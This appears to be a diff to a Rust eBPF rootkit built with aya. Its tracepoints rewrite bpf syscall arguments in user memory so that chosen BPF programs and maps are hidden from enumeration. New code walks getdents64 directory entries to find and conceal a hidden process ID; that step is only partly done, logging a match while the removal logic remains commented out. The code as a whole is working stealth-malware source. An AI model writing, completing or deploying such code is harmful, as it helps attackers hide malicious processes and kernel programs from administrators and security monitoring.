@@ -3,13 +3,13 @@
 
 use aya_ebpf::{
     bindings::{bpf_attr, bpf_cmd},
-    cty::{c_int, c_void},
+    cty::c_void,
     helpers::{bpf_get_current_pid_tgid, bpf_loop, bpf_probe_read, bpf_probe_write_user},
     macros::{map, tracepoint},
     maps::HashMap,
     programs::TracePointContext,
 };
-use aya_log_ebpf::info;
+use aya_log_ebpf::{debug, error, info};
 
 #[map]
 static PROG_SKIP: HashMap<u32, u32> = HashMap::<u32, u32>::with_max_entries(32, 0);
@@ -56,14 +56,14 @@ fn stealth_bpf(ctx: TracePointContext) -> Result<u32, u32> {
             let prog_id = unsafe { attr_cpy.__bindgen_anon_6.__bindgen_anon_1.prog_id };
             if let Some(skip_id) = unsafe { PROG_SKIP.get(&prog_id) } {
                 update_obj_id(BpfObjType::Prog, *skip_id, &mut attr_cpy, mut_attr)?;
-                //info!(&ctx, "prog: {} -> {}", prog_id, *skip_id);
+                debug!(&ctx, "prog: {} -> {}", prog_id, *skip_id);
             }
         }
         bpf_cmd::BPF_MAP_GET_NEXT_ID => {
             let map_id = unsafe { attr_cpy.__bindgen_anon_6.__bindgen_anon_1.map_id };
             if let Some(skip_id) = unsafe { MAP_SKIP.get(&map_id) } {
                 update_obj_id(BpfObjType::Map, *skip_id, &mut attr_cpy, mut_attr)?;
-                //info!(&ctx, "map: {} -> {}", map_id, *skip_id);
+                debug!(&ctx, "map: {} -> {}", map_id, *skip_id);
             }
         }
         bpf_cmd::BPF_PROG_GET_FD_BY_ID => {
@@ -72,7 +72,7 @@ fn stealth_bpf(ctx: TracePointContext) -> Result<u32, u32> {
             if let Some(hidden_progs) = unsafe { HIDDEN_BPF_OBJ.get(&0) } {
                 if hidden_progs.contains(&prog_id) {
                     update_obj_id(BpfObjType::Prog, u32::MAX, &mut attr_cpy, mut_attr)?;
-                    //info!(&ctx, "prog: {}-> max", prog_id);
+                    debug!(&ctx, "prog: {}-> max", prog_id);
                 }
             }
         }
@@ -82,7 +82,7 @@ fn stealth_bpf(ctx: TracePointContext) -> Result<u32, u32> {
             if let Some(hidden_maps) = unsafe { HIDDEN_BPF_OBJ.get(&1) } {
                 if hidden_maps.contains(&map_id) {
                     update_obj_id(BpfObjType::Map, u32::MAX, &mut attr_cpy, mut_attr)?;
-                    //info!(&ctx, "map: {} -> max", map_id);
+                    debug!(&ctx, "map: {} -> max", map_id);
                 }
             }
         }
@@ -131,15 +131,12 @@ impl<T> ::core::fmt::Debug for __IncompleteArrayField<T> {
         fmt.write_str("__IncompleteArrayField")
     }
 }
-pub type __s64 = ::aya_ebpf::cty::c_longlong;
-pub type __u64 = ::aya_ebpf::cty::c_ulonglong;
-pub type s64 = __s64;
-pub type u64_ = __u64;
+
 #[repr(C)]
 #[derive(Debug)]
-pub struct linux_dirent64 {
-    pub d_ino: u64_,
-    pub d_off: s64,
+pub struct LinuxDirent64 {
+    pub d_ino: ::aya_ebpf::cty::c_ulonglong,
+    pub d_off: ::aya_ebpf::cty::c_longlong,
     pub d_reclen: ::aya_ebpf::cty::c_ushort,
     pub d_type: ::aya_ebpf::cty::c_uchar,
     pub d_name: __IncompleteArrayField<::aya_ebpf::cty::c_char>,
@@ -156,33 +153,58 @@ struct DirentData<'a> {
 }
 
 #[inline]
-unsafe fn patch_dirent_if_found(ctx: *mut c_void) -> c_int {
-    let direntdata = ctx as *mut DirentData;
-    info!((*direntdata).ctx, "inside!");
-    //    if(is_end_of_buff(data->bpos, data->buff_size)) return 1;
+fn patch_dirent_if_found(idx: u32, ctx: &mut DirentData) -> i64 {
+    if idx >= MAX_DIRENTS {
+        return 1;
+    }
+    if let Ok(dirent) = unsafe {
+        bpf_probe_read((ctx.dirents_buf_addr + ctx.bpos) as *const LinuxDirent64).map_err(|_| 1u32)
+    } {
+        ctx.bpos += dirent.d_reclen as u64;
+        let hidden_pid_bytes = unsafe { core::ptr::read_volatile(&HIDDEN_PID) }.to_be_bytes();
 
-    //    u8 dirname[MAX_NAME_LEN];
-    //    struct linux_dirent64 * dirent = get_dirent(*data->dirents_buf, data->bpos);
+        let dname_slice = unsafe { dirent.d_name.as_slice(4) };
 
-    //    read_user__reclen(&data->d_reclen, &dirent->d_reclen);
-    //    read_user__dirname(dirname, dirent->d_name);
-
-    //    struct userspace_data * userspace_data = data->userspace_data;
-
-    //    int max_str_len = get_str_max_len(userspace_data->dirname_to_hide, dirname, userspace_data->dirname_len);
-
-    //    if (is_dirname_to_hide(max_str_len, dirname, userspace_data->dirname_to_hide)) {
-    //       data->patch_succeded = remove_curr_dirent(data);
-    //       return 1;
-    //    }
-
-    //    data->d_reclen_prev = data->d_reclen;
-    //    data->bpos += data->d_reclen;
+        for (a, b) in dname_slice.into_iter().zip(hidden_pid_bytes) {
+            if *a as u8 != b {
+                break;
+            }
+            let caller_pid = (bpf_get_current_pid_tgid() >> 32) as u32;
+            info!((*ctx).ctx, "{}: FOUND IT!", caller_pid);
+        }
+    } else {
+        error!((*ctx).ctx, "iter {} not found:(", idx);
+        return 1;
+    }
+    if ctx.bpos >= ctx.max_offset {
+        debug!((*ctx).ctx, "maxoffset exceeded");
+        return 1;
+    }
     0
 }
+//    if(is_end_of_buff(data->bpos, data->buff_size)) return 1;
+
+//    u8 dirname[MAX_NAME_LEN];
+//    struct linux_dirent64 * dirent = get_dirent(*data->dirents_buf, data->bpos);
+
+//    read_user__reclen(&data->d_reclen, &dirent->d_reclen);
+//    read_user__dirname(dirname, dirent->d_name);
+
+//    struct userspace_data * userspace_data = data->userspace_data;
+
+//    int max_str_len = get_str_max_len(userspace_data->dirname_to_hide, dirname, userspace_data->dirname_len);
+
+//    if (is_dirname_to_hide(max_str_len, dirname, userspace_data->dirname_to_hide)) {
+//       data->patch_succeded = remove_curr_dirent(data);
+//       return 1;
+//    }
+
+//    data->d_reclen_prev = data->d_reclen;
+//    data->bpos += data->d_reclen;
 #[tracepoint]
 pub fn stealth_pid_exit(ctx: TracePointContext) -> Result<u32, u32> {
-    let hidden_pid: u32 = unsafe { core::ptr::read_volatile(&HIDDEN_PID) };
+    debug!(&ctx, "sys_exit");
+
     let caller_pid = (bpf_get_current_pid_tgid() >> 32) as u32;
 
     let max_offset = unsafe { ctx.read_at::<u64>(16).map_err(|_| 1u32)? };
@@ -195,16 +217,15 @@ pub fn stealth_pid_exit(ctx: TracePointContext) -> Result<u32, u32> {
         d_reclen: 0,
         d_reclen_prev: 0,
     };
+
     unsafe {
         bpf_loop(
             MAX_DIRENTS,
-            patch_dirent_if_found as *mut fn(*mut c_void) -> i32 as *mut c_void,
+            patch_dirent_if_found as *mut fn(u64, *mut c_void) -> i64 as *mut c_void,
             &mut dirent_data as *mut DirentData as *mut c_void,
             0,
         )
     };
-    // let dirent = unsafe { bpf_probe_read(dirent_addr as *const linux_dirent64).map_err(|_| 1u32)? };
-    // info!(&ctx, "{}", dirent.d_reclen);
 
     PID_DIRENTS.remove(&caller_pid).map_err(|_| 1u32)?;
     Ok(0)
@@ -214,26 +235,3 @@ pub fn stealth_pid_exit(ctx: TracePointContext) -> Result<u32, u32> {
 fn panic(_info: &core::panic::PanicInfo) -> ! {
     unsafe { core::hint::unreachable_unchecked() }
 }
-
-// {
-//     if(is_end_of_buff(data->bpos, data->buff_size)) return 1;
-
-//     u8 dirname[MAX_NAME_LEN];
-//     struct linux_dirent64 * dirent = get_dirent(*data->dirents_buf, data->bpos);
-
-//     read_user__reclen(&data->d_reclen, &dirent->d_reclen);
-//     read_user__dirname(dirname, dirent->d_name);
-
-//     struct userspace_data * userspace_data = data->userspace_data;
-
-//     int max_str_len = get_str_max_len(userspace_data->dirname_to_hide, dirname, userspace_data->dirname_len);
-
-//     if (is_dirname_to_hide(max_str_len, dirname, userspace_data->dirname_to_hide)) {
-//        data->patch_succeded = remove_curr_dirent(data);
-//        return 1;
-//     }
-
-//     data->d_reclen_prev = data->d_reclen;
-//     data->bpos += data->d_reclen;
-//     return 0;
-//  }
